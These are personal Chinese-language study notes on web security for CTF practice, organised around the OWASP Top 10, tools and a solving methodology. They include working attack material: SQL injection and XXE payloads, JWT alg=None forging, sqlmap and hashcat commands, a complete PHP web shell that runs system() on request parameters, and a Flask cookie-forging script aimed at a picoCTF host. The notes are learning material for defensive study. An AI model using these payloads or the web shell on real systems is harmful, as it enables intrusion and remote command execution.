# Experience
- RESTful的抓包和破解尝试（包括更改url（path和query string），更改body，更改method等）
    - 猜url是非常常见的事儿，也就是可以在没有进展的时候进行path_traversal
- 查看html的hidden项
- 同级和向上的入侵，尝试权限修改
- 除了手动猜测之外，也要利用好网站自己就暴露出来的功能
- 攻击者一般是在没有任何session的情况下尝试攻击的，因此有session的情况下很多防御手段都会无效化
- 浏览器会自动进行URL normalization，也就是把`../`,`%2e%2e/`这类path traversal attack的字符直接删除
    - 但只有一层，用`%%32%65`仍会解码保留成`%2e`
- file:///etc/passwd：linux中的系统用户配置文件
- 学网安可以反向进行一些相当有趣的防护
- openssl就是一个开源的SSL/TLS层，有各种加密功能
- 邮件劫持？

### CIA + AAN
- CIA
    - Confidentiality
        - 资源保护，未授权不能获得某些资源
    - Integrity
        - 完整性，也就是数据应该一致，不能随意更改
    - Availability
        - 字面意思，服务器烧了、着火了都算不available
- AAN
    - Authentication
        - identify who you are
    - Authorisation
        - give function based on who you are
    - Non-repudiation
        - 不可否认性：用唯一的数字签名来标识发送方
        - 为了让数据也拥有法律效力

# OWASP
- A01 Broken Access Control
- A02 Cryptographic Failures
- A03 Injection
- A04 Insecure Design
- A05 Security Misconfiguration
- A06 Vulnerable and Outdated Components
- A07 Identification and Authentication Failures
- A08 Software and Data Integrity Failures
- A09 Security Logging and Monitoring Failures
- A10 Server Side Request Forgery (SSRF)
### A01 Broken Access Control
- types:
    - Insecure Direct Object Reference (IDOR)
        - types：
            - Path traversal: url path的直接引用获取
                - 尝试直接访问后端端口
                - 尝试遍历更改query string来获取资料（甚至直接写'../../../sys.ini'）
                - 一般可以找热门wordlists来BF寻找
            - JWT, tickets这类的单一验证
    - Cross-Site Request Forgery (CSRF)
        - elevation of privilege
        - 常见于只使用session和其cookies来验证的网站
        - 成功提升后要记得更新session
- experience
    - 从抓包中找到些资讯，然后尝试用在url上作为param或者query string
### A02 Hash & Cryptographic Failures
- most commonly used algorithm
    - MD
        - MD2/4/5被证明有漏洞
        - 抗碰撞性较差（较容易重复）
            - 这两个文件的MD5是一样的：[hello和erase](https://www.mscs.dal.ca/~selinger/md5collision/)
        - 但性能较好
        - 但不推荐使用
    - SHA
        - SHA1被证明有漏洞
        - SHA2/3是安全的
        - SHA2家族：(数字代表最后生成了多少位的哈希值，斜杠代表虽然用的是斜杠前的算法，但斜杠后才是最后输出的哈希值位数)
            - SHA-224、SHA-256、SHA-384
            - SHA-512、SHA-512/224、SHA-512/256
        - SHA3
            - 抗碰撞性更强
            - 基于不同的底层算法
            - 包括 SHA3-224、SHA3-256、SHA3-384 和 SHA3-512
- 答题常见的加密解密
    - JWT(SHA)
    - base64（==结尾）
    - XOR（参考：xakgK\Ns9=8:9l1?im8i<89?00>88k09=nj9kimnu 和 0x08 XOR得出结果）
- UUID Universal Unique Identifier
    - 全局唯一标识符
    - 有很多不同版本，基于的算法和结果的特性也很不一样
- hash是可能被破解的，用些hash的识别网站就有可能
    - URL modifying
- cookie
- Unsalted Hash vs Salted Hash
    - Salted: 引入了随机数的哈希算法
    - Unsalted: 相同输入会输出相同结果的哈希算法
        - 因此可以被BFS出来
- Signature
    - RAW Signature
    - CMS Signature
    - SOAP Signature
    - Email Signature
    - PDF/Word Signature
        - 因此政府机构会用有证书的PDF传输文件
- keystore/truststore
    - keystore用来储存私钥和公钥验证证书（公钥验证证书就是客户端在第二次握手会验证的那块东西）
        - 各种keystore：
            - File based keystore：用一个文件储存
            - Database keystore：用数据库储存
            - Hardware keystore：直接储存在硬件，无法被盗取。但使用场景极少，只有需要高度安全的场景才会使用
    - truststore用来储存各种CA证书，包括根证书和中间证书
    - 有趣的是，大公司的内网访问外网，其实是公司自己作为中转服务器来签发CA给客户端以及和目标服务端建立连接。而由于公司内网肯定会信任这个中转CA，HTTPS的一个例外情况被利用在企业内网安全上
- "Let's Encrypt"是免费的CA网站

### A03 injection
- 有很多种
- cross-site scripting injection (XSS)
    - 在受害者网站内运行script/code
    - html也可以进行XSS，比如通过eventhandler来运行script
    - css也可以进行XSS，比如再url()内输入具体url协议来运行恶意代码
    - 有很多种:
        - Self-XSS
            - 没有触发服务器请求的XSS，比如单纯alert一下cookie
        - Reflected XSS (non-persistent XSS attack)
            - 用户/网站的行为就是镜子，把恶意代码反射给服务端
            - non-persistent是因为这些有恶意代码的场景都是特制的
            - 简易流程
                - 攻击者给用户发送一个恶意连接，内部包含一些script，比如会给攻击者主动发送信息
                - 用户在其session中点击并向服务器发出了恶意请求
                - 请求响应返回给用户，然后恶意script被执行，给攻击者发送敏感信息
            - 可能的使用场景：
                - 在http请求中嵌入代码，如在query string写script
                - 在表单的input写script
        - Stored XSS（persistent XSS attack）
            - 把有害代码通过某种方式保存到app里，每当app的这个功能被触发就会触发有害代码
            - e.g. 在comment中插入script，只要有用户加载了这条评论就会运行script
        - DOM-based XSS
            - 和reflected XSS很像，但不使用http来攻击，而是用响应式js的动态DOM来运行恶意代码
            - 因此在服务端没法识别到这种攻击，因为往服务端发的http请求中没有痕迹
- XML external entity injection (XXE) 
    - 在接受XML的应用服务中，利用XXE语言的特性来获得敏感信息
    - 首先要知道其可以被XXE
    - 然后再知道其具体是什么元素可以XXE，这些有风险元素其实很固定，换一个就不行了
    - eg: 有风险元素是`<data>`中的`<ID>`
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!-- 定义根元素，以定义实体供xxe注入 -->
        <!DOCTYPE aaa [ 
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        
        <data>
            <ID>
                &xxe;
            </ID>
        </data>
            
        ```
- OS injection/Remote Code Execution (RCE)
    - 直接在服务端的os运行代码
    - 类型：
        - 参数传到linux中并运行某命令，用`;`或者`&&`来在那一条行中运行多条命令
- SQL injections
    - 基本上关键在于熟悉SQL语句的语法和找到一定能通过的语句
        - sql: OR 1=1
        - nosql: {$ne: null}
        - PostgreSQL: syntax是一样的，但是终端的交互记得加`;`
    - experiences
        - 留心开头和结尾的引号
            - e.g. `"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";`如果要注入，得处理尾部的`'`（例如注释掉或者用另一个'接上）
    - neutralizing a condition: 
        - `--`/`/**/`在SQL中代表注释符
            - `admin';--`
            - `SELECT * FROM users WHERE username = '[admin';--] AND password = 'password';`
        - `OR`
            - `10002'+OR+1=1;--`
            - `SELECT * FROM result WHERE student_id = '[10002'OR1=1;--] AND released = 1`
        - `except`(SQLite,Post)/`NOT IN`(MySQL)
            - `admin' except select * from users where username=''`
            - 变成`SELECT * FROM users WHERE username='admin' [except select * from users where username=''] AND password='yyy';`，
            - 意思就是把所有username='admin'的字段全部返回，除了username为空且password为yyy的字段。这也意味着我们可以用无用的except来逃避password的检查，因为password的检查被except处理了。
        - `glob`/`LIKE`/`SIMILAR TO`/`a' IS NOT 'b`
            - 本质上就是给条件对比的值填入TRUE或者等价表达式，这样SQL就会匹配所有字段
            - 类似LIKE，但会使用UNIX通配符，或者说基础的正则匹配
            - `' glob '*`
            - `SELECT * FROM users WHERE username='admin' AND password='[' glob '*]';`
    - 躲避过滤：
        - `||`, `CONCAT`, `+`
            - 字符串拼接，可以用来逃过简单的filter
            - eg：`admin`被filter了，但`ad||min`没有
    - Common attackable query command
        - SELECT, UPDATE, DELETE
        - findOne
    - types:
        - In-Band
            - when use the same channel to send sql query and get result
            - 2 types:
                - Error based 
                    - utilize error meesage thrown
                - Union based
                    - 因为我们输入的参数被sql使用的位置一般在末尾的where之类的，因此用union关键字才能同时select些别的
                    - ORDER BY可以用列索引来判断被注入的sql查询的列数
                    - union的两个查询结果的列数要一样
                        - 用ORDER BY和常量扩充列数来保证列数相同
                - （LIKE可能也能用？）
        - Out-of Band 
            - 用sql语句叫数据库把信息泄露给外网
            - 仅适用于能够发出DNS、HTTP或者SMB请求的数据库
            - SQL原来可以进行DNS请求
            - 用load_file()，把任何敏感信息作为子域名发给SLD的DNS服务器，DNS服务器就可以看到这个敏感信息
            - xp_dirtree
        - Inferential (Blind)
            - 一般用于无法直接获得查询结果的情况下，也就是无法直接知道有没有查询到
            - 本质上就是猜数据库里的数据是什么，如果猜对了就会在各种方面返回和没猜对不一样的值，以此判断得出正确的值
            - Boolean based
                - 直接暴力遍历值等于什么，如果猜对了一般会时网络请求中包长度变长，我们就可以知道这个值是正确的
            - Time based
                - 利用了AND和OR的短路机制
                    - 例如把延迟函数放在AND最后一个条件，这样如果前面的条件为false则不会延迟，而延迟了的条件都是正确的条件
        - Vulnerability test
            - common ways
                - single quotation marks `'`
                - SQL specific syntax such as ASCII characters
                - Boolean conditions (e.g., `' OR 1=1--`)
                - Payloads to trigger time delays (e.g., `'; waitfor delay ('0:0:30')--`)
                - Payloads to trigger out-of-band network interaction (e.g., `exec master..xp_cmdshell 'whoami'`)
            - tools
                - SQLMAP (open-source penetration testing tool)
            - ways to protect
                - input validation
                - parameterised/prepared queries (also known as prepared statements)（其实就是把query封装一下，让query可以用指定参数名而不是字符串拼接的方式填入session数据）
                - character-escaping functions
                - web application firewall to monitor requests and block malicious traffic.
- 一些防范injection的手段：
    - cookie设置HttpOnly（防止DOM-based XSS）
    - CSRF token：动态生成会话唯一的token来标识合法http请求
        - 让攻击者在没有对应session的情况下无法伪造请求
- experience
    - FROM INFORMATION_SCHEMA.SYSTEM_USERS可以用来当select一个const时的语法补足：单纯select 'abc'会报错，select 'abc' FROM INFORMATION_SCHEMA.SYSTEM_USERS就不会

### A04 Insecure Design
- 一些准则：
    - Threat modelling
    - Secure design pattern
    - Secure component libraries
    - Reference architecture
- Unprotected Storage of Credentials
    - Common examples:
        - Storing password in plaintext format in application's properties
        - Hardcoding logon credentials on unencrypted configuration files
        - Saving decryption keys on network drives
    - 其实就是以防有人真的得到了storage的权限
- Trust Boundary Violation
    - 用于把系统的不同部分分隔开
    - 对输入和输出进行过滤和验证可以让数据穿过这些边界

### A05 Security Misconfiguration


### A06 Vulnerable and Outdated Components
- CVE (Common Vulnerabilities and Exposures)
    - 就是公开一些架构内被发现的漏洞
    - 有意思的是，直到现在仍然有不少CVE指名存在漏洞的框架或者版本被使用
    - ways to evaluate severity of a CVE: CVSS (Common Vulnerability Scoring System)
        - [0.0-10.0]
- Vulnerable and Outdated Components Attack
    - 生产环境使用已经没维护的版本
        - 可能早就被标注会有攻击风险
    - 包括框架、库什么的
    - eg CVE-2021-41773
        - apache 2.4.49/2.4.50这两个版本虽然过滤了一些简单的特殊字符，如遇到`/`,`.`啥的会直接删除，但没有过滤`%2e`这类编码，导致可以用`%2e%2e%2f`访问`../`路径
        - 此外，没有进行访问权限控制也是问题之一

### A07 Identification and Authentication Failures
- Credential Stuffing
    - 在拥有一个账号和密码的情况下，自动化尝试用这个账密登入不同的网站
- Brute Force Attack
    - 通过工具生成账密来尝试登入
    - 常用工具：
        - crunch，用以客制化生成规则
        - hydra：用以进行HTTP/SSL/FTP等的authentication
        - 直接找wordlist
- Session Hijacking
    - 用session ID之类的东西登入账号
- Session Fixation
    - 把提前生成/fix好的session id发给别人，让别人以这个session id登入以此把用户绑定此id，这样攻击者就可以用同一个session id伪装用户发送请求
- Multi-factor Authentication (MFA)
    - 比较常用的MFA：One-Time Password (**OTP**)
        - 只能使用一次，下次就重新生成
            - 不然会有replay attack
        - 需要有BF protection和integrity check
            - BF protection不能只是限制次数，否则绕过用以检测限制的部分即可，例如修改headers
            - integrity check是指验证OTP指向的用户，而不会登录到随便某个刚好也在登录的用户
        - 如果OTP重发而之前的OTP仍然有效，那么会有可以bypass rate limit的方法。但有一万种方法可以防止这简单的漏洞
- MFA fatigue or prompt bombing
    - 不停发MFA的验证请求让用户疲劳厌烦，最后同意其中一个MFA请求
    - 需要事先已经知道用户的账密才能有机会触发MFA验证请求
- JWT
    - 分为header、claims、signature
    - header可以声明alg，因此如果对方没有验证alg，可以使用alg=None来伪造任意合法JWT
    - header和claims其实只是单纯的base64url加密，重点是signature会使用密钥把header和claims签名
    - 记得要改exp时间
    - 配合 refresh token可以延长JWT的life span
    - ***改jwt最好改全套，只改role啥的可能仍会被block***

### A08 Software and Data Integrity Failures
- 简单来说就是数据或者软件被中途篡改了，但没有验证就被使用了
    - 其实也意味着trust boundary没设置好，把不安全的source也trust了
- 这也意味着要阅读源码或者知道源码的大致样子才能exploit
- 分类Software Integrity Failures和Data Integrity Failures
- Software Integrity Failures常见原因
    - 软件未验证
    - 更新机制有漏洞，例如CI/CD中被安装恶意代码或者通信时截获修改转发信息
- Data Integrity Failures常见原因
    - 传输数据没签名、验证
    - Serialization attack
        - php的反序列化会自动把内容识别为类，如果后端有对应的类的定义就会直接认为反序列化的内容是这个类，相当白痴
        - php序列化例子：
            - eg
            ```php
            <?php
                class Example {
                    public $string;
                    public $integer;
                    public $float;
                    public $boolean;
                    public $null;
                    public $array;
                    public $object;

                    public function __construct() {
                        $this->string = "Hello, World!";
                        $this->integer = 42;
                        $this->float = 3.14159;
                        $this->boolean = true;
                        $this->null = null;
                        $this->array = [11, 22, 33, "foo" => "bar"];
                        $this->object = new stdClass();
                        $this->object->property = "value";
                    }
                }

                $example = new Example();
                $serialized = serialize($example);
                echo "Serialized: " . $serialized . "\n";

                $unserialized = unserialize($serialized);
                print_r($unserialized);
            ?>
            <!-- 输出：Serialized: O:7:"Example":7:{s:6:"string";s:13:"Hello, World!";s:7:"integer";i:42;s:5:"float";d:3.14159;s:7:"boolean";b:1;s:4:"null";N;s:5:"array";a:4:{i:0;i:11;i:1;i:22;i:2;i:33;s:3:"foo";s:3:"bar";}s:6:"object";O:8:"stdClass":1:{s:8:"property";s:5:"value";}} -->
            Pretty parse：
            Serialized: 
                O:7:"Example":7:{
                    s:6:"string"; s:13:"Hello, World!";
                    s:7:"integer"; i:42;
                    s:5:"float"; d:3.14159;
                    s:7:"boolean"; b:1;
                    s:4:"null"; N;
                    s:5:"array"; a:4:{i:0;i:11; i:1;i:22; i:2;i:33; s:3:"foo"; s:3:"bar";}
                    s:6:"object"; O:8:"stdClass":1:{
                        s:8:"property";
                        s:5:"value";
                    }
                }
            ```
    - cookie没设计
    - 上传/下载文件没验证
    - 输入输出验证

### A09 Security Logging and Monitoring Failures
- OWASP Top 10：Failure - A09
    - Improper Output Neutralization for Logs
    - Omission of Security-relevant Information
    - Insertion of Sensitive Information into Log File (cont’d.)
- Improper Isolation or Compartmentalization
    - 就是用户权限没有做好，导致用户可以访问的资源和功能没有隔离开
    - 所以会导致Broken Access Control
- Unrestricted upload of file with dangerous type
    - 绕过验证文件种类的逻辑，也算在这一部分
    - 常见的文件类型验证方法
        - 后缀检查
        - request的Content-Type检查
        - file header检查（这和http的header没有关系）
            - png
- Reverse Shell
    - Netcat
- sql各种现代函数

### A10 Server-Side Request Forgery (SSRF)
- 伪造请求，使用服务器内的功能，比如组织里的内网功能
- 有点类似OS injection/RCE
- Common SSRF
    - Server SSRF: 注入本地ip 127.0.0.1/admin之类的，
    - Back-end SSRF：注入其他内网ip 192.168.10.8之类的，用有缺陷的服务器访问敏感服务器，因为不少情况下内网的各项服务之间的通信不会有权限控制
    - 

### 暂时还没分类的vulnerability
- Shell
    - shell是命令行解释器/脚本环境
    - interactive shell: 解释键盘键入的command的shell
    - non-interactive shell: 就是不解释command，而是解释script的shell
    - Web Shell
        - 上传到服务器并被运行的恶意脚本
        - 其实本质上是一份script，但因为有可能可以进行RCE，我们随意地修改script内容就能和背后的non-interactive shell交互，因此也可以把这个script理解为一个shell界面
    - Remote Shell
        - 让服务器与外部机器远程连接，使外部机器能够操作服务器
        - 类型：
            - Bind Shell：
                - 首先你得能够直接访问服务器，包括有其IP和可以连接，如果有防火墙或者服务器没法连接外网肯定就不行了
                - 具体流程：让服务器listen来自外部机器的连接，然后外部机器与服务器建立TCP连接，这样就可以用很多协议来exploit服务器了
            - Reverse Shell：
                - 让服务器主动和外部机器建立连接
                - 一般通过RCE让服务器自己主动进行恶意操作，例如开启防火墙、打开端口什么的
    - ways 
- File Inclusion
    - 让服务器运行unexpected的脚本
    - 有两种
        - Remote File Inclusion RFI
            - 上传恶意脚本或者URL提供脚本并让服务器加载运行
        - Local File Inclusion LFI
            - 让服务器运行其本地的文件
            - 或会需要path traversal
            - `../etc/passwd`有点像，但这只是read而非execution
            - 奇怪的还没来得及学的可以用于File Inclusion exploitation PHP Wrapper
                - PHP filter
                - PHP ZIP
                - PHP Data
                - PHP Expect
- Denial of Service (DoS)
    - DDoS就是指Distributed Denial of Service
- Magic Hash Attack
    - 简单来说就是手动搓出特定哈希值，以达到某些神奇效果的技术
    - eg：
        - PHP宽松对比时，字符串以0e，1e之类的开头，就会把这个字符串解析为科学计数法的数字
        - 因此如果另一边是字符串，就可以触发PHP宽松对比数字和字符串时的自动转换机制，把另一边转换成数字。
        - 如此就可以通过操控科学计数法的数字来手动和被转换成数字的字符串进行匹配，bypass验证

# Cybersecurity Protection Techniques
- Demilitarized Zone DMZ
- zero trust architecture
    - 每一个节点间的通信都需要验证
- trust boundary
- 正确的log
    - 包含必要的追踪信息，例如ip source
    - 不要放入敏感信息

# tools
- BurpSuite
    - repeator, intruder
    - path traveral
- netcat
    - `nc`
    - 用来在多台设备间传输数据用的，例如可以给服务器设置后门
    - 也可以用来扫端口
- nmap
    - 扫某个url的端口的
    - 一般参数用 `-p-`就行了，自动尝试不同协议和不同端口
- sqlmap
    - 可以自动判断有没有sqli漏洞
    - 一般来说直接把form payload写入--data参数就会被自动解析和检测
    - `sqlmap -u "http://example.com/login" --data="username=admin&password=1234"`
    - `sqlmap -u "http://example.com/login" --data="username=admin&password=1234" --dbs`
    - `sqlmap -u "http://example.com/login" --data="username=admin&password=1234" -D database_name --tables`
    - `sqlmap -u "http://example.com/login" --data="username=admin&password=1234" -D <database_name> -T <table_name> --columns`
    - `sqlmap -u "http://example.com/login" --data="username=admin&password=1234" -D <database_name> -T <table_name> -C "<column_name1>,<column_name2>"`
    - `--dump`pretty输出查询到的内容，加上`--output-dir="/path/to/output"`可用保存到指定文件夹里，文件夹里会有对应的csv文件
    - 如果没有--data，就会尝试注入一些常见的payload，例如id、user之类的
- gobuster
    - 用wordlist遍历各种东西，例如路径、服务、sub-domain等
    - 用法：
        - 暴力破解目录或者文件`gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt`
- hash-identifier
    - cyber chief其实就行
- hashcat
    - `hashcat -a 0 -m 16500 D:\learning\PWC\wordlists\jwt.txt D:\learning\PWC\wordlists\rockyou.txt -d 1`
- websites tools: 
    - cyber chief
    - crack station


- 好用的script：
    - 制造webshell
    ```php
    <!-- 每次submit都会触发一次GET，然后php会捕获和处理这个get -->
    <!-- name=<?php echo basename($_SERVER['PHP_SELF']); ?> 用于防止表单名称冲突 -->
    <html>
        <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
                <input type="SUBMIT" value="Execute">
            </form>
            <pre>
                <?php
                    if(isset($_GET['cmd']))
                    {
                        system($_GET['cmd']);
                    }
                ?>
            </pre>
        </body>
    </html>
    ```
    - 找.txt文件：
        - 最简单的`ls`
        - `find / -name “*.txt”`
    - python 自动化查询
        - eg
        ```py
        # Import Libraries
        from bs4 import BeautifulSoup
        from subprocess import run
        import requests

        url = "http://mercury.picoctf.net:44693/"

        # Get cookie
        session = requests.Session()
        response = session.get(url)
        cookie = session.cookies.get_dict().get('session')

        # Create wordlist
        cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

        F = open('wordlist.txt', 'w') 
        for name in cookie_names:
            F.write(name + "\n")
        
        F.close()

        # convert
        secret = run(f"flask-unsign --unsign --cookie {cookie} --wordlist ./wordlist.txt").stdout
        payload = "\"{'very_auth':'admin'}\""
        sign = run(f"flask-unsign --sign --cookie {payload} --secret {secret}").stdout

        # Send cookies to website
        cookies = dict(session=sign[:-1])
        response = requests.get(url, cookies=cookies)
        soup = BeautifulSoup(response.text, "html.parser")

        # Retreive flag from page
        flag = soup.select("body > div.container > div.jumbotron > p:nth-child(2)")[0]
        print(flag.get_text())
        ```

# useful vocab
- privilege
- RBAC（Role-Based Access Control，基于角色的访问控制）
- audit 审核
- exploit 恶意利用
- Breach 破坏/违规/突破
- Phishing 网络钓鱼
- tier 层级
- segregation 分隔

# other
- firefox的开发者工具有些奇怪，有时候不会显示图片和css的source，用chrome好些
- 对于path的过滤，如果不知道背后的过滤逻辑，就得尝试各种看起来自相矛盾的测试，比如可以../flag.txt但不能../../aaa/flag.txt
- md，命名格式啥的也很重要，我们要有创造力，admin.phps昭示着可能的index.phps
- 读源码的技巧：
    - 检查所有import、include、fetch、`./xxxx`之类的访问文件的语句，这样或许会暴露更多信息
    - 检查入口出口、判断语句、错误处理


# Methodology
1. 找可用之处
    - path traversal
        - 先手动找常见的path
            - robots.txt
            - .git
            - index.php
        - 然后gobuster找热门wordlists来BF寻找
            - wordlist: SecLists/Discovery/Web-Content/common.txt，或者就在桌面的wordlists里
    - 看源码
        - 不止html，还包括css和js的源码
    - 抓包
        - jwt、任何神秘json
2. 根据反馈尝试expliot
    - 有事没事都base64一下任何奇怪的乱码
    - 现在见过的例子：
        - common sense: 
            - 简单到只要根据文字意思修改http header就行
            - 恶心的CBC
        - XXE：抓包发现POST可以根据包地格式XXE
        - web shell：robots.txt发现了/instruction描述验证方法和/uploads/文件夹供上传文件的访问以此web shell 
        - sql injection：
            - 提供了源码，其中email和password用了JSON解析，因此可以exploit为`{"$ne": null}`
            - 在部分关键字filter的情况下，可以用其他字句实现注入，具体而言就是`||`和`a' IS NOT 'b`
        - 神秘的乱码：
            - JWT：
                - 应用用jwt验证，看源码获得secret，crack jwt的几个字段就搞定了
                - 改成none
            - base64：把base64拆开了两半放在query string中，两者结合起来解码后就是flag（这个真是防不胜防，必须要时刻留意
            - XOR（参考：xakgK\Ns9=8:9l1?im8i<89?00>88k09=nj9kimnu 和 0x08 XOR得出结果）
            - CBC bit flip: [here](../picoCTF/web%20expliot/More%20Cookie/improved_script.py)
        - path traversal：通过源码发现css或者js的目录，以此递归遍历寻找 里面的flag
        - 抓包：发现用cookie明文来设置权限，改成1破解
        - 神秘的文件名字猜测：从robots.txt发现了admin.phps，以此猜测出index.phps的存在，然后接着递归寻找index.phps的其他源码
        - 读源码：
            - js: 简单粗暴在source code里面的base64 flag
            - php: 理解代码之后，向对应文件发送对应的序列化攻击cookie，得到flag
            - flask: 源码有secret，用flask自带的工具处理就行
        - 



# to-do
<!-- - A7 JWT token，第七题 -->
- Week 10 第10页
- 所以每天三道picoCTP就差不多了